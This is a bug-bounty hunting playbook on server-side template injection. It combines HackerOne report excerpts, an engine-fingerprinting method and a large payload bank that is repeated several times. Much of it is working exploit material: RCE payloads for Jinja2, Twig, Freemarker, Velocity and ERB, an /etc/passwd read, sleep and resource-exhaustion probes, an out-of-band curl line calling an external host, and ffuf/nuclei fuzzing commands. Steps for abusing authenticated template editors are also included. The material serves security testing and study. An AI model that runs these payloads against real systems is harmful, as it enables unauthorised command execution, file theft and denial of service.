### uber.com may RCE by Flask Jinja2 Template Injection

`#125980` · Uber · $10,000 · n/a · 2016-04-06 · ▲137
> Hi, Uber Security Team I found an RCE in rider.uber.com. First, if you change your profile name to {{ '7' 7 }}, and you will receive a mail "Your Uber account information has been updated" sent by support@uber.com And in mail body, you can see your name become '7777777' This is a vulnerability about Flask Template Engine(Jinja2) Injection , more detail can be seen in these blogs https://nvisium.com/blog/2016/03/09/exploring-ssti-in-flask-jinja2/…

### Urgent: Server side template injection via Smarty template allows for RCE

`#164224` · Unikrn · $0 · n/a · 2017-08-17 · ▲122
> It appears as though you are using smarty on the backend for templating. Entering a malicious payload as my firstname, lastname and nickname and then inviting a user to join the site results in the code being executed. To start, I began with the payload {7 7} and received a template error in the email I received {F115749} Recognizing the injection, I then was able to confirm the version of smarty used via {$smarty.version} {F115750} Next I was able to…

### Unrestricted File System Access via Twig Template Injection on dev-ucrm-billing-demo.ubnt.com

`#301406` · Ubiquiti Inc. · $0 · high · 2018-03-07 · ▲47
> The researcher found a Local File inclusion vulnerability, this could be exploited by using Twig templates available on the system. This vulnerability only have the potential to affect dev-ucrm-billing-demo.ubnt.com, although is limited by the restricted environment (docker) with don't allow any sensitive information leak.

### 14. SSTI — SERVER-SIDE TEMPLATE INJECTION

> Easy to detect, high payout ($2K–$8K). Direct path to RCE.

### Length-constrained injection fields (profile name, display name, subject)

When the injectable field caps input length (a profile-name / display-name field is often ≤30-64 chars), the full `os.popen` one-liner won't fit — but detection and class-enumeration still do. Confirm with the short probe, then enumerate the gadget index in stages instead of one payload:
```python
{{ '7'*7 }}                                  # detection, fits anywhere
{{ [].__class__.__base__.__subclasses__() }} # dump class list, pick the index for subprocess.Popen/os
{{ ''.__class__.__mro__[1].__subclasses__()[INDEX]('id',shell=True,stdout=-1).communicate() }}
```
The reflected sink is frequently an **outbound email** (the account-update / confirmation mail rendering your name), not the web page — read the email body for the evaluated output. Disclosed: reports/125980 (profile-name → Jinja2 → confirmation email, length-limited).

### Where to Test

```
Name/bio/description fields, email templates, invoice name, PDF generators,
URL path parameters, search queries reflected in results, HTTP headers reflected
```

### CMS / "documentation" template-editor forms (authenticated)

Some SSTI lives behind a logged-in template editor (CMS "edit template" / product-template / email-template
preview). PortSwigger's *"SSTI using documentation"* class is this shape. Three things break a naive attempt:

1. **Fingerprint BEFORE firing RCE — the engine decides the syntax.** Do NOT assume Jinja2. Probe the
   whole matrix and read which one evaluates:
   ```
   ${7*7}  → 49  AND  #{7*7} → 49   ⇒ Freemarker (Java)   ← {{7*7}} does NOTHING here
   {{7*7}} → 49                      ⇒ Jinja2 / Twig
   <%= 7*7 %> → 49                   ⇒ ERB (Ruby)
   *{7*7}  → 49                      ⇒ Thymeleaf (Spring)
   ```
   If `{{7*7}}` renders literally but `${7*7}`→49, you are on **Freemarker** — stop sending `{{config...}}`.

2. **The record id is usually a QUERY param, not a body field.** The editor form posts back to
   `POST /…/template?productId=N` with the id in the URL. The BODY carries only
   `csrf`, `template`, and a `template-action` (`preview` | `save`). Putting the id in the body returns
   `400 "Missing product id"`. So keep the id in the query string (`?productId=N`) AND send a
   form-encoded body of `csrf=…&template=<PAYLOAD>&template-action=preview`.

3. **Re-fetch the CSRF each time and use `preview` to iterate.** GET the editor page to read a *fresh*
   `csrf` hidden field; `template-action=preview` renders your payload WITHOUT persisting (fast feedback
   loop). Switch to `template-action=save` only once the payload is right, then trigger the render
   (load the public page that uses the template) to fire the command.

   **Freemarker documentation RCE** (the documented `Execute` utility — this IS the intended technique):
   ```
   <#assign ex="freemarker.template.utility.Execute"?new()>${ ex("id") }
   ```
   Velocity equivalent: `#set($e="e");$e.getClass().forName("java.lang.Runtime")...`.

---

## Companion methodology (complete, deduplicated)

Full text of every non-SKILL.md methodology document from the contributing skills.

### Companion: hunting / references/payloads.md

# SSTI — Combined Field Guide — Payload reference

Moved out of `SKILL.md` to keep the main playbook lean. Load this file when you need concrete payload.

---

## Payloads & probes



- Jinja2 -> `{{config}}` `{{cycler.__init__.__globals__.os.popen('id').read()}}`

- Twig -> `{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}`

- Freemarker -> `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}`

- ERB -> `<%= system('id') %>`



## Payload bank



**37 curated payloads** in 5 context groups. Try them in order, stop at the first hit, then minimize. These are seeds, not a substitute for understanding the sink.



### Detection polyglots



```text

{{7*7}}

${7*7}

<%= 7*7 %>

#{7*7}

{7*7}

*{7*7}

@(7*7)

{{7*'7'}}

${7*'7'}

{{7*7}}${7*7}<%= 7*7 %>#{7*7}

${{7*7}}

{{= 7*7}}

```



### Jinja2 / Twig / Python



```text

{{config}}

{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}

{{cycler.__init__.__globals__.os.popen('id').read()}}

{{lipsum.__globals__['os'].popen('id').read()}}

{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}

{{''.__class__.__mro__[1].__subclasses__()}}

{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}

{{['id']|filter('system')}}

{{['id']|map('system')|join}}

{% for x in range(3) %}x{% endfor %}

```



### Freemarker / Velocity / Java



```text

<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}

${"freemarker.template.utility.Execute"?new()("id")}

#set($x=7*7)$x

#set($e="".getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("id"))

$class.inspect("java.lang.Runtime").type.getRuntime().exec("id")

#foreach($i in [1..3])$i#end

```



### ERB / Ruby / Rails



```text

<%= 7*7 %>

<%= system('id') %>

<%= `id` %>

<%= IO.popen('id').read %>

<%= File.read('/etc/passwd') %>

<%= Rugged::Repository.new('/').head.target_id %>

```



### Blind / OOB



```text

{{7*'7'}}

{{lipsum.__globals__['os'].popen('sleep 5').read()}}

${T(java.lang.Runtime).getRuntime().exec('sleep 5')}

<%= sleep(5) %>

{{range(1000000000)}}

```



Copyable lists:

- `~/.local/share/hackerone-reports/wordlists/payloads_ssti.txt` (37)



## Payload fragments observed



Recurring payloads from this class's writeups. Adapt, don't paste blindly.



| Seen | Fragment |

|---:|---|

| 2× | `{php}$s = file_get_contents('/etc/passwd',NULL, NULL, 0, 100); var_dump($s);{/php}` |

| 2× | `{{7*7}}` |

| 2× | `{{...}}` |

| 1× | `{{ this }}` |

| 1× | `{{ this.__proto__ }}` |

| 1× | `{{ this.__proto__.constructor.name }}` |

| 1× | `https://<shop>.myshopify.com/admin/apps/returnmagic` |

| 1× | `{{this}}` |

| 1× | `{php}print "Hello"{/php}` |

| 1× | `{F115751}. Finally I used file_get_contents to begin extracting the etc/pass file` |

| 1× | `-alert(document.domain)-` |

| 1× | `with($context) { / with($registry) { / return {typedInput: ''-alert(document.domain)-''} / } / }` |

| 1× | `window.parent.postMessage(JSON.stringify({ / message: "Shopify.API.Modal.input", / data: { / message: { / message: "", / value: "'-alert(doc` |

| 1× | `/admin/oauth/authorize?client_id=5b7bd427b8caa69610bf85d1c87d4a04&scope=read_products&redirect_uri=https://attackerdoma.in/a4d76231-8657-48e` |

| 1× | `/admin/apps/$id` |

| 1× | `shopify-whitehat-1@bored.engineer` |

| 1× | `$your-shop$.myshopify.com` |

| 1× | `https://mercantile.wordpress.org/search/{{constructor.constructor('alert(document.domain)')()}}` |

| 1× | `{{2*2}}` |

| 1× | `curl -os{popen('sleep 10').read()} --url gyvgzienwleealjmudejwl83p3p29bxi9.oast.fun` |



## Parameters observed



`url` · `name` · `Search` · `client_id` · `scope` · `redirect_uri` · `state` · `custom` · `template` · `signature` · `content_type` · `content`



## Wordlists



Mined from this class's writeups and ready for `ffuf`/`feroxbuster`. Paths and parameters recur across programs; verify each hit.



| File | Entries |

|---|---:|

| `~/.local/share/hackerone-reports/wordlists/paths_ssti.txt` | 21 |

| `~/.local/share/hackerone-reports/wordlists/params_ssti.txt` | 12 |

| `~/.local/share/hackerone-reports/wordlists/payloads_ssti.txt` | 37 |

| `~/.local/share/hackerone-reports/wordlists/paths.txt` (global) | 500 |

| `~/.local/share/hackerone-reports/wordlists/params.txt` (global) | 400 |



```sh

W=~/.local/share/hackerone-reports/wordlists

ffuf -u https://target/FUZZ -w $W/paths_ssti.txt \

     -mc all -fc 404 -fs 0 -rate 40

ffuf -u 'https://target/api?FUZZ=canary' -w $W/params_ssti.txt \

     -mr 'canary|error|invalid|not found' -rate 40

ffuf -u 'https://target/api?<param>=FUZZ' -w $W/payloads_ssti.txt \

     -mr '<hit-marker>' -rate 20

```



## Nuclei



Test name/email/subject/template/preview fields; confirm engine before RCE.



```sh

nuclei -u https://target -tags ssti \

       -severity low,medium,high,critical -rl 40 -o nuclei_ssti.txt

nuclei -u https://target -t ~/nuclei-templates/dast/vulnerabilities/ssti -dast \

       -rl 40 -o nuclei_ssti_ssti.txt

# authenticated surface: add -H 'Cookie: session=...' or -H 'Authorization: Bearer ...'

```



Triage every hit by hand: a template match is a lead, not a finding. Update templates with `nuclei -update-templates`.

### Companion: hunting / references/techniques.md

# SSTI — Combined Field Guide — Technique reference

Moved out of `SKILL.md` to keep the main playbook lean. Load this file when you need concrete technique.

---

## Quick wins



Start here. These are the highest-yield tests for this class.



- Fuzz template syntax: `{{7*7}}`, `${7*7}`, `<%= 7*7 %>`, `#{7*7}`.

- Identify the engine from output and error messages.

- Escalate to file read/RCE with engine-specific payloads.

- Check email templates, PDF/report generators, and theme editors.



## Bypass tricks



- Bypass filters with string concatenation, `attr`, `|join`, and hex escapes.

- Use sandbox escapes for the specific engine/version.

- Blind SSTI via time delays or OOB.



## Deeper checklist



- Fuzz template syntax: `{{7*7}}`, `${7*7}`, `<%= 7*7 %>`, `#{7*7}`.

- Identify the engine from evaluated output and error messages.

- Escalate to file read/RCE with engine-specific payloads.

- Check sandbox escapes and filter bypasses.

- Look at email templates, PDF/report generators, and theme editors.

- Prove execution with a harmless callback or command output.



## Techniques from real reports



One concrete lesson per report (mined from the writeup), newest and most-upvoted first. Read 5–10 before testing.



- **H1514 Server Side Template Injection in Return Magic email templates?** — `#423541` · Shopify · $0 · ▲409

  > `{{ this. proto .constructor.name }}` -- `Object`

- **uber.com may RCE by Flask Jinja2 Template Injection** — `#125980` · Uber · $10,000 · ▲137

  > First, if you change your profile name to {{ '7' 7 }}, and you will receive a mail

- **Urgent: Server side template injection via Smarty template allows for RCE** — `#164224` · Unikrn · $0 · ▲122

  > To start, I began with the payload {7 7} and received a template error in the email I received {F115749} Recognizing the injection, I then was able to confirm the version of smarty used via {$smarty.version} {F115750} Next I was able to test {php} tags by…

- **Management Console Editor Privilege Escalation to Root SSH Access in GitHub Enterprise Server via nomad template injection and audit-forward** — `#2332623` · GitHub · $0 · ▲80

  > A command injection vulnerability was identified in GitHub Enterprise Server that allowed an attacker with an editor role in the Management Console to gain admin SSH access to the appliance via nomad templates when configuring audit log forwarding.

- **Management Console Editor Privilege Escalation to Root SSH Access in GitHub Enterprise Server via nomad template injection** — `#2332551` · GitHub · $0 · ▲61

  > A command injection vulnerability was identified in GitHub Enterprise Server that allowed an attacker with an editor role in the Management Console to gain admin SSH access to the appliance via nomad templates when configuring SMTP options.

- **Unrestricted File System Access via Twig Template Injection on dev-ucrm-billing-demo.ubnt.com** — `#301406` · Ubiquiti Inc. · $0 · ▲47

  > This vulnerability only have the potential to affect `dev-ucrm-billing-demo.ubnt.com`, although is limited by the restricted environment (docker) with don't allow any sensitive information leak.

- **Client Side Template Injection to Stored XSS in Image Collection** — `#2234564` · Mars · $0 · ▲39

  > Client-side template injection vulnerabilities arise when applications using a client-side template framework dynamically embed user input in web pages.

- **Reflected XSS on developer.uber.com via Angular template injection** — `#125027` · Uber · $3,000 · ▲35

  > `https://developer.uber.com/docs/deep-linking?q=wrtz{{( ="".sub).call.call({}[$="constructor"].getOwnPropertyDescriptor( . proto ,$).value,0,"alert(1)")()}}zzzz`

- **XSS in $shop$.myshopify.com/admin/ via twine template injection in "Shopify.API.Modal.input" method when using a malicious app** — `#217790` · Shopify · $1,000 · ▲31

  > The method wraps the attribute value in a [with](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/with) block to provide named variables and passes it to a…

- **[mercantile.wordpress.org] Reflected XSS via AngularJS Template Injection** — `#230234` · WordPress · $0 · ▲29

  > I came across a potential exploitation vector after noticing that a search query for `{{2 2}}` returned `4` in the site title response.

- **Server Side Template Injection on Name parameter during Sign Up process** — `#1104349` · Glovo · $0 · ▲28

  > In this scenario, when an attacker signs up on the platform and uses a payload in the First Name field, the payload is rendered server side and it gets executed in the promotional/welcome emails sent to the user

- **SSTI leads to Command injection** — `#3584149` · curl · $0 · ▲25

  > unhanticated Rce via command line with sleep break the server until finish the request

- **Unauthenticated SSRF in 3rd party module "cerdic/csstidy"** — `#1595006` · Nextcloud · $250 · ▲17

  > To download remote data as CSS file, either use the interface or try this: http://example.com/apps/mail/vendor/cerdic/css-tidy/css optimiser.php?url=http://localhost/apps/richdocuments/docs/custom.css&custom=1&template=4

- **Client-side Template Injection in Search, user email/token leak and maybe sandbox escape** — `#271960` · Rockstar Games · $0 · ▲15

  > We resolved this issue by updating our version of AngularJS, and by applying the `ng-non-bindable` directive to the vulnerable fields.

- **[marketplace.informatica.com] -  Template Injection** — `#299241` · Informatica · $0 · ▲12

  > The researcher has identified and reported a "Template Injection" vulnerability in one of Informatica's domain and helped us in resolving the issue.

- **Stored xss via template injection** — `#250837` · WordPress · $0 · ▲12

  > 3.change name to {{constructor.constructor('alert(1)')()}} & forward request.

- **Server-side Template Injection in lodash.js** — `#904672` · Node.js third-party modules · $0 · ▲8

  > Step 3: Visit the vulnerable application and enter a payload such as `${JSON.stringify(process.env)}` into the `name` parameter e.g.

- **Self-DoS due to template injection via email field in password reset form on access.acronis.com** — `#1265344` · Acronis · $0 · ▲7

  > Open [https://access.acronis.com/reset password/new] and Enter the mail Payload : sudo bash{{8 8}}@wearehackerone.com

- **XSS via Client Side Template Injection on www.███/News/Speeches** — `#1736317` · U.S. Dept Of Defense · $0 · ▲6

  > `https://www.████/News/Speeches/?Search={{window['eval'](window['atob'](window['decodeURIComponent']('BASE 64 ENCODED PAYLOAD')))}}`

- **Server-side template injection at ujs test server** — `#942103` · Ruby on Rails · $0 · ▲5

  > https://github.com/rails/rails/blob/v6.0.3.2/actionview/test/ujs/server.rb



## Case studies



### H1514 Server Side Template Injection in Return Magic email templates?

`#423541` · Shopify · $0 · n/a · 2019-04-04 · ▲409

> Summary: Possible template injection in return magic email templates. Description: I've been playing with return magic workflow email templates and there seems to be some kinda of template injection but I am not sure if it's exploitable or even valid. Here is why I think it could be vulnerable: I set the email template to the following and then test the template and then the results go to my gmail inbox. {{ this }} - [Object Object] {{ this.



### uber.com may RCE by Flask Jinja2 Template Injection

`#125980` · Uber · $10,000 · n/a · 2016-04-06 · ▲137

> Hi, Uber Security Team I found an RCE in rider.uber.com. First, if you change your profile name to {{ '7' 7 }}, and you will receive a mail "Your Uber account information has been updated" sent by support@uber.com And in mail body, you can see your name become '7777777' This is a vulnerability about Flask Template Engine(Jinja2) Injection , more detail can be seen in these blogs https://nvisium.com/blog/2016/03/09/exploring-ssti-in-flask-jinja2/…



### Urgent: Server side template injection via Smarty template allows for RCE

`#164224` · Unikrn · $0 · n/a · 2017-08-17 · ▲122

> It appears as though you are using smarty on the backend for templating. Entering a malicious payload as my firstname, lastname and nickname and then inviting a user to join the site results in the code being executed. To start, I began with the payload {7 7} and received a template error in the email I received {F115749} Recognizing the injection, I then was able to confirm the version of smarty used via {$smarty.version} {F115750} Next I was able to…



### Management Console Editor Privilege Escalation to Root SSH Access in GitHub Enterprise Server via nomad template injection and audit-forward

`#2332623` · GitHub · $0 · high · 2024-09-13 · ▲80

> A command injection vulnerability was identified in GitHub Enterprise Server that allowed an attacker with an editor role in the Management Console to gain admin SSH access to the appliance via nomad templates when configuring audit log forwarding. Exploitation of this vulnerability required access to the GitHub Enterprise Server instance and access to the Management Console with the editor role.



### Unrestricted File System Access via Twig Template Injection on dev-ucrm-billing-demo.ubnt.com

`#301406` · Ubiquiti Inc. · $0 · high · 2018-03-07 · ▲47

> The researcher found a Local File inclusion vulnerability, this could be exploited by using Twig templates available on the system. This vulnerability only have the potential to affect dev-ucrm-billing-demo.ubnt.com, although is limited by the restricted environment (docker) with don't allow any sensitive information leak.



## Query the corpus



```sh

python3 ~/.local/share/hackerone-reports/h1.py search "<keyword>" --class ssti --limit 20

python3 ~/.local/share/hackerone-reports/h1.py stats --class ssti

python3 ~/.local/share/hackerone-reports/h1.py show <id> --full

```



Search by technology, endpoint, parameter, or program. Examples:



```sh

python3 ~/.local/share/hackerone-reports/h1.py search "wordpress" --class ssti

python3 ~/.local/share/hackerone-reports/h1.py search "reset token" --class ssti --min-bounty 1000

```

## Corpus payload bank (curated)

### Detection polyglots

```text
{{7*7}}
${7*7}
<%= 7*7 %>
#{7*7}
{7*7}
*{7*7}
@(7*7)
{{7*'7'}}
${7*'7'}
{{7*7}}${7*7}<%= 7*7 %>#{7*7}
${{7*7}}
{{= 7*7}}
```

### Jinja2 / Twig / Python

```text
{{config}}
{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}
{{cycler.__init__.__globals__.os.popen('id').read()}}
{{lipsum.__globals__['os'].popen('id').read()}}
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
{{''.__class__.__mro__[1].__subclasses__()}}
{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}
{{['id']|filter('system')}}
{{['id']|map('system')|join}}
{% for x in range(3) %}x{% endfor %}
```

### Freemarker / Velocity / Java

```text
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
${"freemarker.template.utility.Execute"?new()("id")}
#set($x=7*7)$x
#set($e="".getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("id"))
$class.inspect("java.lang.Runtime").type.getRuntime().exec("id")
#foreach($i in [1..3])$i#end
```

### ERB / Ruby / Rails

```text
<%= 7*7 %>
<%= system('id') %>
<%= `id` %>
<%= IO.popen('id').read %>
<%= File.read('/etc/passwd') %>
<%= Rugged::Repository.new('/').head.target_id %>
```

### Blind / OOB

```text
{{7*'7'}}
{{lipsum.__globals__['os'].popen('sleep 5').read()}}
${T(java.lang.Runtime).getRuntime().exec('sleep 5')}
<%= sleep(5) %>
{{range(1000000000)}}
```

## Corpus wordlists (mined)

### `params_ssti.txt`

```text
url
name
Search
client_id
scope
redirect_uri
state
custom
template
signature
content_type
content
```

### `paths_ssti.txt`

```text
/docs/deep-linking
/News/Speeches/
/News/Speeches
/blog/2016/03/09/exploring-ssti-in-flask-jinja2/
/blog/2016/03/11/exploring-ssti-in-flask-jinja2-part-ii/
/php
/docs/4.17.4
/api/sdks/merchant-apps/embedded-app-sdk
/admin/oauth/authorize
/twine/
/admin
/kg/en/bishkek/
/apps/mail/vendor/cerdic/css-tidy/temp/
/apps/mail/vendor/cerdic/css-tidy/css_optimiser.php
/my-account/edit-account/
/my-account/edit-address/
/package/lodash
/reset_password/new
/echo
/error
/layouts_and_rendering
```

### `payloads_ssti.txt`

```text
{{7*7}}
${7*7}
<%= 7*7 %>
#{7*7}
{7*7}
*{7*7}
@(7*7)
{{7*'7'}}
${7*'7'}
{{7*7}}${7*7}<%= 7*7 %>#{7*7}
${{7*7}}
{{= 7*7}}
{{config}}
{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}
{{cycler.__init__.__globals__.os.popen('id').read()}}
{{lipsum.__globals__['os'].popen('id').read()}}
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
{{''.__class__.__mro__[1].__subclasses__()}}
{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}
{{['id']|filter('system')}}
{{['id']|map('system')|join}}
{% for x in range(3) %}x{% endfor %}
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
${"freemarker.template.utility.Execute"?new()("id")}
#set($x=7*7)$x
#set($e="".getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("id"))
$class.inspect("java.lang.Runtime").type.getRuntime().exec("id")
#foreach($i in [1..3])$i#end
<%= system('id') %>
<%= `id` %>
<%= IO.popen('id').read %>
<%= File.read('/etc/passwd') %>
<%= Rugged::Repository.new('/').head.target_id %>
{{lipsum.__globals__['os'].popen('sleep 5').read()}}
${T(java.lang.Runtime).getRuntime().exec('sleep 5')}
<%= sleep(5) %>
{{range(1000000000)}}
```

## Source skills merged into this topic

- `h1skills` — `hackerone-ssti`
- `hunting` — `ssti`
- `cbh` — `hunt-ssti`

## Provenance

- `references/unified-method.md` — same deduplicated union as this file, for tooling
- `references/upstream-*.md` — unmodified original SKILL.md from each repo
- `references/upstream-assets/` — 2 companion files
- `../../upstream/` — complete unmodified archives of all five source repositories
- `bbhunt-methodology` — orchestrator, state machine and class router
